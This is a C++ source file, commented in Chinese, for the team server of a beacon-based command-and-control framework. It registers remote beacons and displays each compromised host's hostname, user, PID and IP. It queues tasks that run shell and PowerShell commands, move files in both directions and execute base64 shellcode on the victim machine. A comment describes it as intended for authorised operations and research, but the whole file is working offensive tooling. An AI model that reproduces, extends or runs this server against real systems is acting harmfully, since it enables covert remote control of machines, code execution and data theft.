#include "../include/protocol.h"
#include "../include/crypto.h"
#include "../include/common.h"

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <queue>
#include <mutex>
#include <thread>
#include <atomic>
#include <memory>
#include <sstream>
#include <iomanip>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>

// ============================================================================
//  Team Server - 远程管理框架服务端
//  仅用于授权的远程运维/安全研究场景
// ============================================================================

using namespace rmf;

// Beacon 会话
struct BeaconSession {
    int sock;
    BeaconInfo info;
    std::queue<Task> task_queue;
    std::mutex mtx;
    std::atomic<bool> alive{true};
    std::thread handler_thread;
};

// 全局状态
std::map<std::string, std::shared_ptr<BeaconSession>> g_beacons;
std::mutex g_beacons_mtx;
std::atomic<uint32_t> g_next_task_id{1};
std::atomic<bool> g_running{true};

// 打印帮助
void PrintHelp() {
    std::cout << "\n========== 命令列表 ==========\n"
              << "  help            显示帮助\n"
              << "  list            列出所有 Beacon\n"
              << "  info <id>       查看 Beacon 详细信息\n"
              << "  select <id>     选择 Beacon 进行交互\n"
              << "  exit            退出服务端\n"
              << "==============================\n";
}

// 打印 Beacon 交互帮助
void PrintBeaconHelp() {
    std::cout << "\n--- Beacon 命令 ---\n"
              << "  cmd <command>       执行命令\n"
              << "  ps <script>         执行 PowerShell\n"
              << "  sysinfo             获取系统信息\n"
              << "  sleep <ms>          修改心跳间隔\n"
              << "  upload <local> <remote>   上传文件\n"
              << "  download <remote>         下载文件\n"
              << "  shellcode <base64>  执行 Shellcode（安全研究）\n"
              << "  back                返回主菜单\n"
              << "  kill                终止该 Beacon\n"
              << "-------------------\n";
}

// 列出所有 Beacon
void ListBeacons() {
    std::lock_guard<std::mutex> lock(g_beacons_mtx);
    if (g_beacons.empty()) {
        std::cout << "[-] 暂无 Beacon 上线\n";
        return;
    }
    std::cout << "\n" << std::left
              << std::setw(20) << "Beacon ID"
              << std::setw(20) << "主机名"
              << std::setw(15) << "用户名"
              << std::setw(10) << "PID"
              << std::setw(20) << "IP"
              << "\n";
    std::cout << std::string(85, '-') << "\n";
    for (const auto& [id, sess] : g_beacons) {
        if (!sess->alive) continue;
        std::cout << std::left
                  << std::setw(20) << id.substr(0, 16)
                  << std::setw(20) << sess->info.hostname
                  << std::setw(15) << sess->info.username
                  << std::setw(10) << sess->info.pid
                  << std::setw(20) << sess->info.ip
                  << "\n";
    }
    std::cout << "\n";
}

// 向 Beacon 下发任务
bool SendTaskToBeacon(const std::string& beacon_id, const Task& task) {
    std::lock_guard<std::mutex> lock(g_beacons_mtx);
    auto it = g_beacons.find(beacon_id);
    if (it == g_beacons.end() || !it->second->alive) {
        return false;
    }
    std::lock_guard<std::mutex> qlock(it->second->mtx);
    it->second->task_queue.push(task);
    return true;
}

// Beacon 处理线程
void BeaconHandler(std::shared_ptr<BeaconSession> sess) {
    int sock = sess->sock;
    std::string beacon_id = sess->info.id;

    std::cout << "[+] Beacon 上线: " << beacon_id
              << " (" << sess->info.hostname << "\\" << sess->info.username
              << ", PID=" << sess->info.pid << ")\n";

    while (g_running && sess->alive) {
        // 等待 Beacon 回连（pull 模式）
        std::vector<uint8_t> raw = RecvMessage(sock);
        if (raw.empty()) {
            std::cout << "[-] Beacon 断开: " << beacon_id << "\n";
            break;
        }

        auto [type, payload] = UnpackMessage(raw, Crypto::GetKey());

        switch (type) {
            case MsgType::HEARTBEAT: {
                // 检查是否有任务待下发
                std::lock_guard<std::mutex> qlock(sess->mtx);
                if (!sess->task_queue.empty()) {
                    Task task = sess->task_queue.front();
                    sess->task_queue.pop();

                    std::vector<uint8_t> task_data = SerializeTask(task);
                    std::vector<uint8_t> msg = PackMessage(MsgType::TASK, task_data, Crypto::GetKey());
                    if (!SendMessage(sock, msg)) {
                        std::cout << "[-] 发送任务失败: " << beacon_id << "\n";
                        sess->alive = false;
                    }
                } else {
                    // 无任务，返回空心跳响应
                    std::vector<uint8_t> empty;
                    std::vector<uint8_t> msg = PackMessage(MsgType::HEARTBEAT, empty, Crypto::GetKey());
                    SendMessage(sock, msg);
                }
                break;
            }
            case MsgType::RESULT: {
                TaskResult result = DeserializeTaskResult(payload);
                std::cout << "\n[结果] Beacon=" << beacon_id
                          << " TaskID=" << result.task_id
                          << " 成功=" << (result.success ? "是" : "否") << "\n";
                if (!result.output.empty()) {
                    std::cout << result.output << "\n";
                }
                std::cout << "> " << std::flush;
                break;
            }
            case MsgType::HELLO: {
                // 重新注册（更新信息）
                BeaconInfo info = DeserializeBeaconInfo(payload);
                sess->info = info;
                break;
            }
            default:
                break;
        }
    }

    // 清理
    close(sock);
    sess->alive = false;
    {
        std::lock_guard<std::mutex> lock(g_beacons_mtx);
        g_beacons.erase(beacon_id);
    }
}

// 接受新连接的线程
void AcceptThread(int listen_sock) {
    while (g_running) {
        sockaddr_in client_addr{};
        socklen_t addr_len = sizeof(client_addr);
        int client_sock = accept(listen_sock, reinterpret_cast<sockaddr*>(&client_addr), &addr_len);
        if (client_sock < 0) {
            if (g_running) {
                std::cerr << "[-] accept 失败\n";
            }
            continue;
        }

        // 接收 HELLO 消息
        std::vector<uint8_t> raw = RecvMessage(client_sock);
        if (raw.empty()) {
            close(client_sock);
            continue;
        }

        auto [type, payload] = UnpackMessage(raw, Crypto::GetKey());
        if (type != MsgType::HELLO) {
            close(client_sock);
            continue;
        }

        BeaconInfo info = DeserializeBeaconInfo(payload);
        info.ip = inet_ntoa(client_addr.sin_addr);

        // 创建会话
        auto sess = std::make_shared<BeaconSession>();
        sess->sock = client_sock;
        sess->info = info;
        sess->alive = true;

        {
            std::lock_guard<std::mutex> lock(g_beacons_mtx);
            g_beacons[info.id] = sess;
        }

        // 启动处理线程
        sess->handler_thread = std::thread(BeaconHandler, sess);
        sess->handler_thread.detach();
    }
}

// 与 Beacon 交互
void InteractWithBeacon(const std::string& beacon_id) {
    PrintBeaconHelp();
    std::string line;
    while (true) {
        std::cout << "beacon(" << beacon_id.substr(0, 8) << ")> " << std::flush;
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;

        std::istringstream iss(line);
        std::string cmd;
        iss >> cmd;

        if (cmd == "back" || cmd == "exit") {
            break;
        } else if (cmd == "help") {
            PrintBeaconHelp();
        } else if (cmd == "cmd") {
            std::string args;
            std::getline(iss, args);
            if (!args.empty()) args = args.substr(1); // 去掉前导空格
            Task task{g_next_task_id++, TaskType::CMD_EXEC, args};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] 任务已下发 (ID=" << task.id << ")\n";
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else if (cmd == "ps") {
            std::string args;
            std::getline(iss, args);
            if (!args.empty()) args = args.substr(1);
            Task task{g_next_task_id++, TaskType::POWERSHELL, args};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] 任务已下发 (ID=" << task.id << ")\n";
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else if (cmd == "sysinfo") {
            Task task{g_next_task_id++, TaskType::SYSINFO, ""};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] 任务已下发 (ID=" << task.id << ")\n";
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else if (cmd == "sleep") {
            std::string ms;
            iss >> ms;
            Task task{g_next_task_id++, TaskType::SLEEP, ms};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] 任务已下发 (ID=" << task.id << ")\n";
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else if (cmd == "upload") {
            std::string local, remote;
            iss >> local >> remote;
            if (local.empty() || remote.empty()) {
                std::cout << "[-] 用法: upload <local> <remote>\n";
                continue;
            }
            // 读取本地文件
            FILE* f = fopen(local.c_str(), "rb");
            if (!f) {
                std::cout << "[-] 无法打开本地文件: " << local << "\n";
                continue;
            }
            fseek(f, 0, SEEK_END);
            long fsize = ftell(f);
            fseek(f, 0, SEEK_SET);
            std::vector<uint8_t> fdata(fsize);
            fread(fdata.data(), 1, fsize, f);
            fclose(f);

            // 参数格式: remote_path|base64_data
            std::string args = remote + "|" + Base64Encode(fdata);
            Task task{g_next_task_id++, TaskType::UPLOAD, args};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] 上传任务已下发 (ID=" << task.id << ", " << fsize << " bytes)\n";
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else if (cmd == "download") {
            std::string remote;
            std::getline(iss, remote);
            if (!remote.empty()) remote = remote.substr(1);
            Task task{g_next_task_id++, TaskType::DOWNLOAD, remote};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] 下载任务已下发 (ID=" << task.id << ")\n";
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else if (cmd == "shellcode") {
            std::string b64;
            iss >> b64;
            Task task{g_next_task_id++, TaskType::SHELLCODE, b64};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] Shellcode 任务已下发 (ID=" << task.id << ")\n";
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else if (cmd == "kill") {
            Task task{g_next_task_id++, TaskType::EXIT, ""};
            if (SendTaskToBeacon(beacon_id, task)) {
                std::cout << "[+] 终止指令已下发\n";
                break;
            } else {
                std::cout << "[-] Beacon 不存在或已离线\n";
            }
        } else {
            std::cout << "[-] 未知命令，输入 help 查看帮助\n";
        }
    }
}

// 主 CLI 循环
void CLI() {
    PrintHelp();
    std::string line;
    while (g_running) {
        std::cout << "server> " << std::flush;
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;

        std::istringstream iss(line);
        std::string cmd;
        iss >> cmd;

        if (cmd == "help") {
            PrintHelp();
        } else if (cmd == "list") {
            ListBeacons();
        } else if (cmd == "info") {
            std::string id;
            iss >> id;
            std::lock_guard<std::mutex> lock(g_beacons_mtx);
            // 支持前缀匹配
            for (const auto& [bid, sess] : g_beacons) {
                if (bid.find(id) == 0) {
                    std::cout << "Beacon ID:  " << bid << "\n"
                              << "主机名:     " << sess->info.hostname << "\n"
                              << "用户名:     " << sess->info.username << "\n"
                              << "系统:       " << sess->info.os_version << "\n"
                              << "IP:         " << sess->info.ip << "\n"
                              << "PID:        " << sess->info.pid << "\n"
                              << "注册时间:   " << sess->info.timestamp << "\n";
                    break;
                }
            }
        } else if (cmd == "select") {
            std::string id;
            iss >> id;
            // 前缀匹配
            std::string full_id;
            {
                std::lock_guard<std::mutex> lock(g_beacons_mtx);
                for (const auto& [bid, sess] : g_beacons) {
                    if (bid.find(id) == 0 && sess->alive) {
                        full_id = bid;
                        break;
                    }
                }
            }
            if (!full_id.empty()) {
                InteractWithBeacon(full_id);
            } else {
                std::cout << "[-] 未找到 Beacon: " << id << "\n";
            }
        } else if (cmd == "exit" || cmd == "quit") {
            g_running = false;
            break;
        } else {
            std::cout << "[-] 未知命令，输入 help 查看帮助\n";
        }
    }
}

int main(int argc, char* argv[]) {
    uint16_t port = DEFAULT_PORT;
    std::vector<uint8_t> key;

    if (argc >= 2) {
        port = static_cast<uint16_t>(std::atoi(argv[1]));
    }
    if (argc >= 3) {
        // 第二个参数为 hex 密钥（可选，否则随机生成）
        key = FromHexString(argv[2]);
    }

    std::cout << "========================================\n"
              << "  Remote Management Framework - Server\n"
              << "  仅用于授权的远程运维/安全研究\n"
              << "========================================\n\n";

    // 生成或使用指定的加密密钥
    if (key.empty() || key.size() < KEY_LEN) {
        key = Crypto::GenerateKey();
    }
    Crypto::SetKey(key);
    std::cout << "[*] 加密密钥: " << ToHexString(key.data(), key.size()) << "\n";
    std::cout << "[*] 请将此密钥配置到 Beacon 端\n\n";

    // 忽略 SIGPIPE
    signal(SIGPIPE, SIG_IGN);

    // 创建监听 socket
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock < 0) {
        std::cerr << "[-] socket 创建失败\n";
        return 1;
    }

    int opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    if (bind(listen_sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) < 0) {
        std::cerr << "[-] bind 失败，端口 " << port << " 可能被占用\n";
        close(listen_sock);
        return 1;
    }

    if (listen(listen_sock, 128) < 0) {
        std::cerr << "[-] listen 失败\n";
        close(listen_sock);
        return 1;
    }

    std::cout << "[+] 监听端口: " << port << "\n";
    std::cout << "[*] 等待 Beacon 连接...\n\n";

    // 启动接受线程
    std::thread accept_thread(AcceptThread, listen_sock);
    accept_thread.detach();

    // 运行 CLI
    CLI();

    // 清理
    g_running = false;
    close(listen_sock);

    {
        std::lock_guard<std::mutex> lock(g_beacons_mtx);
        for (auto& [id, sess] : g_beacons) {
            sess->alive = false;
            if (sess->handler_thread.joinable()) {
                sess->handler_thread.join();
            }
        }
    }

    std::cout << "\n[*] 服务端已退出\n";
    return 0;
}
